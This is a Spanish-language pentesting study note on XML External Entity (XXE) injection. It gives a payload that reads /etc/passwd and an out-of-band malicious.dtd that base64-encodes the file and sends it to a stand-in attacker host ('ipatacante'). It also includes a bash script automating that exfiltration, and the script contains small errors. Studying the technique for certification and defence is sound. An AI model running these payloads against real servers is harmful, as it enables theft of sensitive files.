## XML External Entity Injection (XXE)
### Concepto ENTIDAD

Con XXE, conseguimos ver el contenido de ficheros sensibles que tiene una máquina víctima a través de peticiones web XML.

Primero debemos conocer que es una entidad. Cuando se declara una ENTITY en XML, estamos dándole un nombre y un valor, que luego se puede utilizar en cualquier campo de datos XML como si fuera una variable. 

Es decir en ENTITY se da el valor, y luego se hace la llamada desde donde queramos y las veces que queramos. Un ejemplo de código:

```
<!ENTITY nom "glmbx">
<root>
	<name>
		&nom; <!-- Aquí estamos haciendo referencia a "glmbx"-->
	</name

	<apellidos>
	Herrera Galamba
	</apellidos>
</root>
```

## Prueba de concepto

Tenemos un formulario de registro, donde introducimos datos y estos se envian al servidor. En este caso, si analizamos con el repeater de burpsuite nos encontraremos que en el output nos devuelve el contenido de uno de los campos que introducimos en el formulario.  

Este campo nos interesa ya que será el que aprovechemos para la inyección. En este  caso es el campo  ```<email></email> ``` 

Declaramos una entidad del tipo **file** en la que le diremos que fichero queremos leer: 
```
<!DOCTYPE foo [<!ENTITY myfile SYSTEM "file:///etc/passwd">]>
<root>
	<name>test</name>
	<tel>1235678</tel>
	<email>&myfile;</email> <!--Aqui hacemos referencia a la entidad, que a su vez está recogiendo los datos del fichero etc/passwd -->
	<password>123235</password>

</root>
```
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/xxe1.png">

## XXE Out of band

Este es el tipo de XXE a ciegas, en el que no vemos el output del ataque. Lo que queremos es que el output nos lo envíe por una petición web a un servidor montado en la maquina atacante.

### Definicion del fichero .DTD
Supongamos que queremos ver el contenido del fichero /etc/passwd: 

"malicious.dtd"
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ipatacante/?file=%file;'>">
%eval;
%exfil;

```

### Realizando la petición

1º Nos montamos un servidor web en la ruta donde tengamos el malicious.dtd
```
python3 -m http.server 80
```

2º Con burpsuite lanzamos la petición:
debajo de la línea ```<?xml version=1.0...>```
definimos:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ipatacante/malicious.dtd"> %xxe;]>
```

y lanzamos la petición. Deberiamos recibir la petición en el servidor web, con el contenido del fichero codificado en base64.

# Extra

Creando un script para automatizar esta tarea.

```
# El usuario por pantalla pide que fichero quiere leer
echo -ne "\n[+] introduce el fichero que quieres leer: && read -r myfilename"

# definiendo en dtd
malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myfilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://ipatacante/?file=%file;'>\">
%eval;
%exfil;"""

echo $malicious_dtd > malicious.dtd

# montando el servidor web y las peticiones iran al fichero response
python3 -m http.server 80 &>response &
PID=$!

sleep 1

# Automatizar la petición web
curl -s -X POST "http://direccionweb_victima_donde_se_hace_la_peticion" -d 
"Con burpsuite en RAW, ponemos todo el codigo de la peticion que puede ser algo asi: <?xlm version="1.0"...><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ipatacante/malicious.dtd"> %xxe;]> ... y el resto del contenido" &>/dev/null


kill -9 $PID
wait $PID 2>/dev/null

# Visualizando el contenido del fichero response
cat response -oP "/?file=\K[^.*\s]+" | base64 -d

rm -f response 2>/dev/null
